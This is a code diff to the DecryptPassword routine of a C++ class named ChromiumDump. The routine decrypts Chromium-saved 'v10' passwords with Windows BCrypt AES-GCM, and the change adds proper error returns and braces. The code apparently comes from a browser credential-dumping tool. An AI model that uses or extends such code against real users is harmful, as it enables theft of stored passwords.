@@ -165,18 +165,25 @@ string ChromiumDump::DecryptPassword(LPCVOID pEncryptedPass, DWORD dwLenEncrypte
 	PUCHAR pDecryptedPass;
 	DWORD dwLenDecryptedPass;
 
-	if(BCryptOpenAlgorithmProvider(&hAlgorithm, BCRYPT_AES_ALGORITHM, NULL, 0) != STATUS_SUCCESS)
+	if (BCryptOpenAlgorithmProvider(&hAlgorithm, BCRYPT_AES_ALGORITHM, NULL, 0) != STATUS_SUCCESS) {
 		#ifdef _DEBUG
 			wcout << L"[-] Failed to open algorithm provider\n";
 		#endif
-	if(BCryptSetProperty(hAlgorithm, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0))
+		return ret;
+	}
+	if (BCryptSetProperty(hAlgorithm, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0)) {
 		#ifdef _DEBUG
 			wcout << L"[-] Failed to set GCM property\n";
 		#endif
-	if(BCryptGenerateSymmetricKey(hAlgorithm, &hKey, NULL, 0, key, AES_KEY_BYTES, 0) != STATUS_SUCCESS)
+		return ret;
+	}
+	if (BCryptGenerateSymmetricKey(hAlgorithm, &hKey, NULL, 0, key, AES_KEY_BYTES, 0) != STATUS_SUCCESS) {
 		#ifdef _DEBUG
 			wcout << L"[-] Failed to generate symmetric key\n";
 		#endif
+		return ret;
+	}
+
 	if ((dwLenEncryptedPass >= sizeof(v10)) && memcmp(pEncryptedPass, v10, sizeof(v10)) == 0)
 	{
 		if (hAlgorithm && hKey)
@@ -207,14 +214,18 @@ string ChromiumDump::DecryptPassword(LPCVOID pEncryptedPass, DWORD dwLenEncrypte
 				free(pDecryptedPass);
 			}
 		}
-		if (hAlgorithm && BCryptCloseAlgorithmProvider(hAlgorithm, 0) != STATUS_SUCCESS)
+		if (hAlgorithm && BCryptCloseAlgorithmProvider(hAlgorithm, 0) != STATUS_SUCCESS) {
 			#ifdef _DEBUG
 				wcout << L"[-]Failed to close algorithm provider\n";
 			#endif		
-		if (hKey && BCryptDestroyKey(hKey) != STATUS_SUCCESS)
+		}
+
+		if (hKey && BCryptDestroyKey(hKey) != STATUS_SUCCESS) {
 			#ifdef _DEBUG
 				wcout << L"[-]Failed to destroy key\n";
 			#endif
+		}
+
 	}
 	return ret;
 }
